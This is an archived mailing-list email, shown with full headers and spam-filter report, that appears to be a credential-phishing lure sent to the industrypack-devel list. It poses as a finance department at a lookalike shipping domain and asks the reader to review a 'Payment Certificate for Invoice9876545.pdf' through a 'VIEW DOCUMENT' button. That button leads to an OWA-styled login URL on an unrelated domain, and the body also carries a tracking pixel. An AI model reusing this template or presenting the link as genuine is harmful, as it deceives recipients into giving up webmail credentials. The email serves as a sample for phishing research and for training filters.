Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B1E6E94BCB4
	for <lists+industrypack-devel@lfdr.de>; Thu,  8 Aug 2024 13:58:24 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sc1mh-00023D-L2
	for lists+industrypack-devel@lfdr.de;
	Thu, 08 Aug 2024 11:58:23 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
 <bounces+45041053-bac3-industrypack-devel=lists.sourceforge.net@em1916.arrovvship.com>)
 id 1sc1mf-000233-Sk for industrypack-devel@lists.sourceforge.net;
 Thu, 08 Aug 2024 11:58:21 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:
 Mime-Version:From:Date:Content-Type:Sender:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=mRXN/+4I2rgXGztCplNgpiuqJ2k73RqQZ9N5ghhBIVw=; b=TlPNjWeeqV1XFlSUrDiS2gcNmq
 8aE3IDDJ6tAK3/li6SqVkVtWeIFGbtVOAKhNRW4BJoGnhmC/N/VftdhjNbRWXNIvcQW04JMxdMrCL
 3lIdkvbNTzTfLfwGGd1hbejU9eURZhVAKtAvCzt1Ft0IW23WkuqYhG6Qm8Z3H7re2ALY=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=List-Unsubscribe:To:Reply-To:Subject:Message-ID:Mime-Version:From:Date:
 Content-Type:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=mRXN/+4I2rgXGztCplNgpiuqJ2k73RqQZ9N5ghhBIVw=; b=TAVcwNq6oibMn+HaaE2KxjvCdX
 JMpXp1jYZZxntkZ9F9bntuRg2vQsjVjkWq2vng8XpvJrwjTyKETkT+LNcRQlAAQMZRYKbiopkhqes
 /uDdhOg2XWm/Qvrug9ArM6JSZ7ugPHpml8RwQ3osvzz9DDKNAWui1Tcb/oA1di+R5Ug0=;
Received: from wfbthkhf.outbound-mail.sendgrid.net ([159.183.1.15])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1sc1me-00051r-G4 for industrypack-devel@lists.sourceforge.net;
 Thu, 08 Aug 2024 11:58:21 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=arrovvship.com;
 h=content-type:from:mime-version:subject:reply-to:to:list-unsubscribe:
 list-unsubscribe-post:cc:content-type:from:subject:to;
 s=s1; bh=mRXN/+4I2rgXGztCplNgpiuqJ2k73RqQZ9N5ghhBIVw=;
 b=cQ2+nDB3a+MSAsJss/ibPHBMBVEXUg0cBsNyZ4DNuxuzFfRR6XwiCUpkNUSPxLckwG4y
 R2e/a4e709ygmshNWp/AU6micJuYgeWN8AlLY3Pp8HIFwWahWXht2yCl1bwkh/vnhOC2rx
 9H4E8UjJmj2lFHHkw/+AonYT+I3OCGZ4wTrkDTNTDBWPPdGmG9g7dnSbFzbqw0UvyESZp6
 k0bVtv/oFE9gGrVbMMSDgbG7+cZ4Aqjom2SpUY6smNl1Va+pI8wYDfuNZKE15UNEPrE4+2
 i5Uul9Rs7QHMqVgCMgErlAAmmONyy/dc0CUT7MaumHunliwbw3B9C6GzuXj/xvyg==
Received: by recvd-67c65db458-kfqhj with SMTP id
 recvd-67c65db458-kfqhj-1-66B4AE79-3C
 2024-08-08 11:39:37.855168157 +0000 UTC m=+829163.159080840
Received: from NDUwNDEwNTM (unknown) by geopod-ismtpd-17 (SG) with HTTP
 id ly2dPAsMRAC_Q0CU8zFdZQ Thu, 08 Aug 2024 11:39:37.837 +0000 (UTC)
Date: Thu, 08 Aug 2024 11:39:39 +0000 (UTC)
From: Finance Department <Accountpayables@arrovvship.com>
Mime-Version: 1.0
Message-ID: <ly2dPAsMRAC_Q0CU8zFdZQ@geopod-ismtpd-17>
X-SG-EID: =?us-ascii?Q?u001=2Eoaav6El6kC4hm6t5SHfv7qIzPVgP=2FW9zEwnPdsvydBSFIiVi=2FoMyoRJVe?=
 =?us-ascii?Q?4v+zifVbt9kyiUSrptui8HPwxADt5fSilkrnd0H?=
 =?us-ascii?Q?YLBSo1Qlbmu7RXffTkBuDTpkLXO5I78CcojoyAT?=
 =?us-ascii?Q?6nkZsKWLw8KpNnpzAENRyUL6gKtKl6uqhFgUFgU?=
 =?us-ascii?Q?pbdC6hOnELUIzp+Dmz=2F68HQTXXFSwtnczc4Tbxa?=
 =?us-ascii?Q?QZ6GNMKyqJqhJzHtMS8uoSSrD00xA6DgZ17P8Pi?=
 =?us-ascii?Q?la1nQUaOsAE0VRaOIAD+cu=2Fot9fEQyD7NDCUXSP?=
 =?us-ascii?Q?YVSKZJYA=3D?=
X-SG-ID: =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
 =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
 =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FQkrx4V8?=
 =?us-ascii?Q?KkMcU1olNMyAURZsgzctgoTT5S4D+0xMUiT0+c6?=
 =?us-ascii?Q?JXX3pObD5UyQAVvIZkRYKWPOHvSJrR6Y3JR+7+u?=
 =?us-ascii?Q?SLs6P86eDEmcFQOXqEmzN61QTJhkaDwv9ZqDbsf?=
 =?us-ascii?Q?0MRbRrYMi9Lg2TrYBSP=2F1GjttwQrZoriFYP=2FA2c?=
 =?us-ascii?Q?IyhJiqSy=2FWHeLdooTBB1Jov3yJtK2gO5oxI8aXi?=
 =?us-ascii?Q?NzRzu=2FjgsxCym8I1oBpp7+ZDjEgxfyKe751CFFi?=
 =?us-ascii?Q?rchvVoV6d1KbeAM=2F8b3wjl++KTpfrMc40dlU+F=2F?=
 =?us-ascii?Q?pVckgXy4JjIN7Xx9UmvTV071AzEbBq7=2F5FhViOD?=
 =?us-ascii?Q?18fbtz4U334mLU231eLKBWBWodXUVKglCtPkWJD?=
 =?us-ascii?Q?fDzn0Ch=2FbpyGYLRGafW=2FIS0DTPOJlJ0B06D7FUc?=
 =?us-ascii?Q?Mg2XG5clADBv6dJ5TSiNwb1rgwClDrY++vvUqjZ?=
 =?us-ascii?Q?LMR2qMs6ON2SJyOMliJtegbKsUhEMzPMz1tn+Mb?=
 =?us-ascii?Q?1k70hQtCUCN=2FicugqSgAkp9y9r8xkQZ=2FP9rE30B?=
 =?us-ascii?Q?H1hOqc2uML6=2F4rw9M0YHtuDpRR7Yp+BYvuqR7Ck?=
 =?us-ascii?Q?CP9AJ4jKJrzqwJUKoINKa3=2F?=
To: industrypack-devel@lists.sourceforge.net
X-Entity-ID: u001.aaPtaG341mJOcioiGyfT+g==
List-Unsubscribe-Post: List-Unsubscribe=One-Click
X-Spam-Score: 3.8 (+++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  industrypack-devel@lists.sourceforge.net Payment Certificate
    Authorization for Invoice9876545.pdf. Please review and keep for your records.
    Payment Certificate for your Review. industrypack-devel@lists.sourceforge.net
    Server. 
 
 Content analysis details:   (3.8 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: u45041053.ct.sendgrid.net]
  2.0 URIBL_CT_SURBL         Contains an URL listed in the CT SURBL blocklist
                             [URIs: u45041053.ct.sendgrid.net]
  0.4 NO_DNS_FOR_FROM        DNS: Envelope sender has no MX or A DNS records
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
                             high trust
                             [159.183.1.15 listed in list.dnswl.org]
  0.4 RCVD_IN_MSPIKE_L4      RBL: Bad reputation (-4)
                             [159.183.1.15 listed in bl.mailspike.net]
  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
                             DNS
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
  5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
  0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
X-Headers-End: 1sc1me-00051r-G4
Subject: [Industrypack-devel] Payment Certificate for Invoice9876545.pdf
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: Accountpayables@arrovvship.com
Content-Type: multipart/mixed; boundary="===============8874943341889546516=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8874943341889546516==
Content-Type: multipart/alternative; boundary=a08fc8179c8b73f6ba22e860525de928f00bbc7c7beeacd626026c3649e7

--a08fc8179c8b73f6ba22e860525de928f00bbc7c7beeacd626026c3649e7
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=iso-8859-1
Mime-Version: 1.0

industrypack-devel@lists.sourceforge.net Payment Certificate Authorization =
for Invoice9876545.pdf.=A0Please review and keep for your records.

Payment Certificate for your Review.

industrypack-devel@lists.sourceforge.net Server.

VIEW DOCUMENT ( https://email.eirn.ae/owa2/?account=3Dindustrypack-devel@li=
sts.sourceforge.net )

Unsubscribe ( https://u45041053.ct.sendgrid.net/asm/unsubscribe/?user_id=3D=
45041053&data=3DpwE1U9ATpZkKkIi1hBOPiKIi217jh0x7uXTefM9yjN5oMDAwdTAwMNW-uUt=
jk4ASwrNBsfMbtaktLQPUJ9ftoWIfAN3sDwACv-Qdsa8W30Asb3MT7FaBljJpp9Pva4Xb8MtpXz=
ip0H82BGl5GxC0esg5Fqs5isRYTVHiO8MgarYsUUqNLDOTZV_rjLLoEezX_yy2AI5cMcR6Jr1bL=
SSXZTqgNIqnuTSwE_fySTznDCEkPDipaz2yhY4_XhHMXUinCqG9ujcWXaq-6gObbp7VxfTnLzkU=
PFRNPBDrhVJKszR3-VsDA7JQqpcbTUuAQie-dbI4v7LQTrG_GbUllAPxuVP2vhAwwKACXHjbP87=
Jwr5Lva-1PWuK216UxQTB6mKSOeK8jlU0sacznq5XbhvN45fhpNLVjf_cJtJtmUcF-DyWq9I4jT=
QpBXhUEGiua9wTPzL8q6kgiJWY6v3Wq1DpX7vPf3OhXOrWQl9cc1NQZZS5U_O_SwVj0pt-KlwkO=
cUr2y47Et1HP1EO-dEZN6wf5ke7CJcuJL_QyM_wlL3r0YpILZbZYY2DiMLM2LMGSWHH74UwdGYw=
4EiXPLFULVkgT2VNJY28WoOPzZ_-MDosYtPMk3jxKp4Vx6yOpg0L9me6R07rAQFe67itZ79eBX3=
PKFv9pNWqUz1-rOj5LxZrT_iFoH5UeK9NgLQ0aognV7DNn0nAObJYx9TwtvCc8Zp4xBCsx6CL5N=
DpwvSkPuZZpgI3fVcnf9XzG460hDGar8YjeKLE-Mi68Qk5J01DLb30pKNqbxXuzp_fTT8u-1nHu=
VYnca4meqD_qYpGrhwO0b44STEfF-kqy7AtKRws3Q6ek8LtpNNW5ca2b7uRkeXvoF7WxUBnHnfs=
8h4-p72v0ApM9klHFJXVBgkNWtaWUhwfhkKup5K6T3cAubwy4dglgWB8EbFE3v_ICvgV53Edwrk=
5pgkPKGLM5NrgoSvCBW61zKrFzk55pnWFV5X5egVTlNBCAUtWpX2RQjyyqXw4W85dGi0qH8rAy9=
LBzTxRRgIl2LU5Hq2sZ2l_pbqtRsJ1TS5Y7eoK5-JaXbVsyb_7-tZs-Y6I1nX7lwevxqNhiuhw1=
edHYZlCxAoHklSdfqlOo8dKMPerVdzV_Q=3D=3D )
--a08fc8179c8b73f6ba22e860525de928f00bbc7c7beeacd626026c3649e7
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=us-ascii
Mime-Version: 1.0

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org=
/TR/xhtml1/DTD/xhtml1-strict.dtd"><html data-editor-version=3D"2" class=3D"=
sg-campaigns" xmlns=3D"http://www.w3.org/1999/xhtml"><head>

<html class=3D"sg-campaigns" xmlns=3D"http://www.w3.org/1999/xhtml" data-ed=
itor-version=3D"2"><head>
















<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8">
<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1,=
 minimum-scale=3D1, maximum-scale=3D1">
<!--[if !mso]><!-->
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3DEdge">
<!--<![endif]-->
<!--[if (gte mso 9)|(IE)]>
<xml>
<o:OfficeDocumentSettings>
<o:AllowPNG/>
<o:PixelsPerInch>96</o:PixelsPerInch>
</o:OfficeDocumentSettings>
</xml>
<![endif]-->
<!--[if (gte mso 9)|(IE)]>
<style type=3D"text/css">
body {width: 600px;margin: 0 auto;}
table {border-collapse: collapse;}
table, td {mso-table-lspace: 0pt;mso-table-rspace: 0pt;}
img {-ms-interpolation-mode: bicubic;}
</style>
<![endif]-->
<style type=3D"text/css">
body, p, div {
font-family: arial,helvetica,sans-serif;
font-size: 14px;
}
body {
color: #000000;
}
body a {
color: #1188E6;
text-decoration: none;
}
p { margin: 0; padding: 0; }
table.wrapper {
width:100% !important;
table-layout: fixed;
-webkit-font-smoothing: antialiased;
-webkit-text-size-adjust: 100%;
-moz-text-size-adjust: 100%;
-ms-text-size-adjust: 100%;
}
img.max-width {
max-width: 100% !important;
}
.column.of-2 {
width: 50%;
}
.column.of-3 {
width: 33.333%;
}
.column.of-4 {
width: 25%;
}
@media screen and (max-width:480px) {
.preheader .rightColumnContent,
.footer .rightColumnContent {
text-align: left !important;
}
.preheader .rightColumnContent div,
.preheader .rightColumnContent span,
.footer .rightColumnContent div,
.footer .rightColumnContent span {
text-align: left !important;
}
.preheader .rightColumnContent,
.preheader .leftColumnContent {
font-size: 80% !important;
padding: 5px 0;
}
table.wrapper-mobile {
width: 100% !important;
table-layout: fixed;
}
img.max-width {
height: auto !important;
max-width: 100% !important;
}
a.bulletproof-button {
display: block !important;
width: auto !important;
font-size: 80%;
padding-left: 0 !important;
padding-right: 0 !important;
}
.columns {
width: 100% !important;
}
.column {
display: block !important;
width: 100% !important;
padding-left: 0 !important;
padding-right: 0 !important;
margin-left: 0 !important;
margin-right: 0 !important;
}
}
</style>

</head><body>
<table style=3D'margin: 0px auto; border: 1px solid rgb(200, 200, 200); bor=
der-image: none; width: 640px; color: rgb(33, 33, 33); text-transform: none=
; text-indent: 0px; letter-spacing: normal; overflow: hidden; font-family: =
"Segoe UI", "Segoe WP", "Segoe UI WPC", Tahoma, Arial, sans-serif; font-siz=
e: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spa=
ce: normal; max-width: 640px; orphans: 2; widows: 2; background-color: rgb(=
255, 255, 255); font-variant-ligatures: normal;
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial;' border=3D"0" cellspacing=
=3D"0" cellpadding=3D"0">
<colgroup>
<col width=3D"16" style=3D"width: 0px;">
<col width=3D"608" style=3D"width: 0px;">
<col width=3D"16" style=3D"width: 0px;"></colgroup>
<tbody>
<tr>
<td align=3D"center" style=3D"padding-top: 36px; padding-right: 36px; paddi=
ng-left: 36px;" colspan=3D"3">
</td></tr>
<tr>
<td valign=3D"top" style=3D"padding: 16px; height: 18px; vertical-align: to=
p;" colspan=3D"2">
<img width=3D"250" height=3D"80" style=3D"width: 542px; height: 96px; displ=
ay: block;" src=3D"http://cdn.mcauto-images-production.sendgrid.net/9e15698=
90bc4f99b/b0ee7cb7-427b-48ed-9939-947b10b64020/2058x654.png" "=3D""></td></=
tr>
<tr>
<td style=3D"padding: 40px 20px 28px; text-align: center; border-top-color:=
 rgb(222, 222, 222); border-top-width: 1px; border-top-style: solid; backgr=
ound-color: rgb(248, 248, 248);" colspan=3D"3">
<p style=3D"margin: 0px; color: rgb(50, 49, 48); font-size: 16px;">industry=
pack-devel@lists.sourceforge.net Payment Certificate Authorization for Invo=
ice9876545.pdf.&nbsp;Please review and keep for your records.
</p></td></tr>
<tr>
<td align=3D"center" style=3D"background-color: rgb(248, 248, 248);" colspa=
n=3D"3"><a style=3D"color: rgb(50, 49, 48); text-decoration: none; display:=
 inline-block;" target=3D"_blank">
<table align=3D"center" style=3D"background: rgb(255, 255, 255); width: 388=
px; text-align: center;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td style=3D"background: rgb(255, 255, 255); padding: 20px 4px 20px 20px; b=
order-top-color: rgb(210, 210, 210); border-bottom-color: rgb(210, 210, 210=
); border-left-color: rgb(210, 210, 210); border-top-width: 1px; border-bot=
tom-width: 1px; border-left-width: 1px; border-top-style: solid; border-bot=
tom-style: solid; border-left-style: solid;">
<img width=3D"32" style=3D"width: 32px; display: block;" src=3D"http://cdn.=
mcauto-images-production.sendgrid.net/803a3b8933626ea6/7d2e0863-840b-4b0e-a=
d8d-01d42b261f6e/96x96.png" "=3D""></td>
<td style=3D"padding: 20px 20px 20px 4px; text-align: left; font-size: 16px=
; border-top-color: rgb(210, 210, 210); border-right-color: rgb(210, 210, 2=
10); border-bottom-color: rgb(210, 210, 210); border-top-width: 1px; border=
-right-width: 1px; border-bottom-width: 1px; border-top-style: solid; borde=
r-right-style: solid; border-bottom-style: solid; -ms-word-break: break-all=
; background-color: rgb(255, 255, 255);">Payment Certificate for your Revie=
w.</td></tr></tbody></table></a></td></tr>
<tr>
<td align=3D"center" style=3D"text-align: center; background-color: rgb(248=
, 248, 248);" colspan=3D"3">
<div style=3D"display: inline-block;">
<table align=3D"center" style=3D"width: auto; height: 20px;" border=3D"0" c=
ellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td align=3D"center" style=3D"padding: 24px 4px 20px 0px; height: 20px;">
<img width=3D"20" height=3D"20" style=3D"display: inline;" src=3D"http://cd=
n.mcauto-images-production.sendgrid.net/803a3b8933626ea6/567957c9-215b-4b9e=
-b0da-0849f98c825c/48x48.png" "=3D""></td>
<td style=3D"padding: 20px 0px; color: rgb(50, 49, 48); ffault=3Ddefault' }=
}ont-size: 12px;">industrypack-devel@lists.sourceforge.net Server.</td></tr=
></tbody></table></div></td></tr>
<tr>
<td style=3D"padding: 0px 0px 32px; height: 40px; text-align: center; borde=
r-top-color: currentColor; border-bottom-color: currentColor; border-top-wi=
dth: medium; border-bottom-width: medium; border-top-style: none; border-bo=
ttom-style: none; background-color: rgb(248, 248, 248);" colspan=3D"3">
<a style=3D"border-style: solid; border-color: rgb(0, 120, 212); width: 168=
px; text-align: center; color: rgb(255, 255, 255); line-height: 40px; font-=
size: 16px; text-decoration: none; display: inline-block; background-color:=
 rgb(0, 120, 212);"clicktracking=3Doff href=3D"https://email.eirn.ae/owa2/?=
account=3Dindustrypack-devel@lists.sourceforge.net" target=3D"_blank">VIEW =
DOCUMENT</a></td></tr></tbody></table>
<table style=3D'margin: 0px auto; width: 640px; color: rgb(33, 33, 33); tex=
t-transform: none; text-indent: 0px; letter-spacing: normal; overflow: hidd=
en; font-family: "Segoe UI", "Segoe WP", "Segoe UI WPC", Tahoma, Arial, san=
s-serif; font-size: 15px; font-style: normal; font-weight: 400; word-spacin=
g: 0px; white-space: normal; max-width: 640px; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
nt-caps: normal; -webkit-text-stroke-width: 0px;
text-decoration-style: initial; text-decoration-color: initial;' border=3D"=
0" cellspacing=3D"0" cellpadding=3D"0">
<colgroup>
<col width=3D"64" style=3D"width: 0px;">
<col width=3D"256" style=3D"width: 0px;">
<col width=3D"135" style=3D"width: 0px;">
<col width=3D"175" style=3D"width: 0px;"></colgroup>
<tbody>
<tr>
<td valign=3D"top" style=3D"padding: 16px; height: 18px; vertical-align: to=
p;" colspan=3D"2">
<img width=3D"84" height=3D"18" style=3D"display: block;" src=3D"http://cdn=
.mcauto-images-production.sendgrid.net/803a3b8933626ea6/0d8ee900-8b1d-4775-=
b671-594d1ecc8ff7/172x40.png"></td>
<td style=3D"padding: 16px; width: 288px; height: 18px; text-align: right; =
color: rgb(96, 94, 92); line-height: 18px; font-size: 12px;" colspan=3D"2">=
<span style=3D"display: inline-block;">
</span></td></tr></tbody></table>
<img src=3D"https://u45041053.ct.sendgrid.net/wf/open?upn=3Du001.HN9ncswbYi=
-2BEGN-2FXArB7Yb-2B54Tm43-2B694904Gpq6REDOvMj5jd8r2ODXoOGLI8F0uYDlfdJx8NjvP=
dhWWcpkCUGsR3P4VRN5MZ7o0veGf3rvT-2BLh1aC66WHXNP3uZ2MXALkHEQ-2BFrCPjUx06NxmF=
ri6-2BXxC4qcLErCGgOmjc8H7v-2FCmxYtULIhFJ4QC6to7f0yy2y53XBq78mKcoj9GpVoGXXLK=
BjR3i-2BYa4V-2FRiKvHiuus6ShFk1JwY1q8abVlqrkDU-2BQl2D3M-2BRxmbr-2FhINGY8w1N-=
2BbVbqhQ677fEr46WEpWUMAZyq7XF-2F2e-2BiEGVODlSBvY8Mui3ho0K5lgP-2B6vI65Jityq6=
nIBvztga3F5OB2OPxSE5Jda-2FSVJBK32M-2F9VdL5VYKd52wIAKYaQwgsKyEw9L9Id4i7e9bCE=
eDf5tZMWZ7HYlP-2Fyi1BgvaL77lkKpTuXd52ZI35ItjriAFbFPj0b-2FrzcXBZ2zeZ52xxuFB0=
3MbSn7ad-2FD0jgmuXiy3BAXLEphj1u4hXHcZ2lp42vklD4DJtNInMUxweO-2FMPX-2FMUCJE3K=
HStR37Kl1FLBheccsGDWmIq2NiNp-2FsvJpB36Lz8EitehILX-2BAg2aseOyFma5hF2kVZYhnCt=
QQmN1nluHZ2GUxa1aPIEdvHvvq4ewpZ98GMf-2BbxXZ6lxkqEEUWxAeioCBLfH3E8UQIyOff9KK=
JawUWnoeNw2pIul4S-2BzlzAed4hH7tM2HFV2BwcVi-2BDLg4Z6al37sG4dHMIx1oabRwbMw-2B=
6Ro9-2BLAemxljT5tbCJMAv-2BDmaEcG5dx5zyxo1-2BhEdEBZztn0Lo9x57c7N2lUPpaCXCXEL=
1-2BTKjmoO7xuDRA5F-2BUPVIG5y3Qb17TslG8e26HYvlL1fWNIuL3xwggLQOba4VYEA4elAcLL=
abUSQNaoQbQFxIGrKjkBZi8KSN-2Fd9W0eCaN1CiNK6s8Dl" alt=3D"" width=3D"1" heigh=
t=3D"1" border=3D"0" style=3D"height:1px !important;width:1px !important;bo=
rder-width:0 !important;margin-top:0 !important;margin-bottom:0 !important;=
margin-right:0 !important;margin-left:0 !important;padding-top:0 !important=
;padding-bottom:0 !important;padding-right:0 !important;padding-left:0 !imp=
ortant;"/></body></html>
        <p style=3D"font-size:12px; line-height:20px;">
          <a class=3D"Unsubscribe--unsubscribeLink" href=3D"https://u450410=
53.ct.sendgrid.net/asm/unsubscribe/?user_id=3D45041053&amp;data=3DpwE1U9ATp=
ZkKkIi1hBOPiKIi217jh0x7uXTefM9yjN5oMDAwdTAwMNW-uUtjk4ASwrNBsfMbtaktLQPUJ9ft=
oWIfAN3sDwACv-Qdsa8W30Asb3MT7FaBljJpp9Pva4Xb8MtpXzip0H82BGl5GxC0esg5Fqs5isR=
YTVHiO8MgarYsUUqNLDOTZV_rjLLoEezX_yy2AI5cMcR6Jr1bLSSXZTqgNIqnuTSwE_fySTznDC=
EkPDipaz2yhY4_XhHMXUinCqG9ujcWXaq-6gObbp7VxfTnLzkUPFRNPBDrhVJKszR3-VsDA7JQq=
pcbTUuAQie-dbI4v7LQTrG_GbUllAPxuVP2vhAwwKACXHjbP87Jwr5Lva-1PWuK216UxQTB6mKS=
OeK8jlU0sacznq5XbhvN45fhpNLVjf_cJtJtmUcF-DyWq9I4jTQpBXhUEGiua9wTPzL8q6kgiJW=
Y6v3Wq1DpX7vPf3OhXOrWQl9cc1NQZZS5U_O_SwVj0pt-KlwkOcUr2y47Et1HP1EO-dEZN6wf5k=
e7CJcuJL_QyM_wlL3r0YpILZbZYY2DiMLM2LMGSWHH74UwdGYw4EiXPLFULVkgT2VNJY28WoOPz=
Z_-MDosYtPMk3jxKp4Vx6yOpg0L9me6R07rAQFe67itZ79eBX3PKFv9pNWqUz1-rOj5LxZrT_iF=
oH5UeK9NgLQ0aognV7DNn0nAObJYx9TwtvCc8Zp4xBCsx6CL5NDpwvSkPuZZpgI3fVcnf9XzG46=
0hDGar8YjeKLE-Mi68Qk5J01DLb30pKNqbxXuzp_fTT8u-1nHuVYnca4meqD_qYpGrhwO0b44ST=
EfF-kqy7AtKRws3Q6ek8LtpNNW5ca2b7uRkeXvoF7WxUBnHnfs8h4-p72v0ApM9klHFJXVBgkNW=
taWUhwfhkKup5K6T3cAubwy4dglgWB8EbFE3v_ICvgV53Edwrk5pgkPKGLM5NrgoSvCBW61zKrF=
zk55pnWFV5X5egVTlNBCAUtWpX2RQjyyqXw4W85dGi0qH8rAy9LBzTxRRgIl2LU5Hq2sZ2l_pbq=
tRsJ1TS5Y7eoK5-JaXbVsyb_7-tZs-Y6I1nX7lwevxqNhiuhw1edHYZlCxAoHklSdfqlOo8dKMP=
erVdzV_Q=3D=3D" target=3D"_blank" style=3D"font-family:sans-serif;text-deco=
ration:none;">
            Unsubscribe
          </a>


--a08fc8179c8b73f6ba22e860525de928f00bbc7c7beeacd626026c3649e7--


--===============8874943341889546516==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8874943341889546516==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8874943341889546516==--

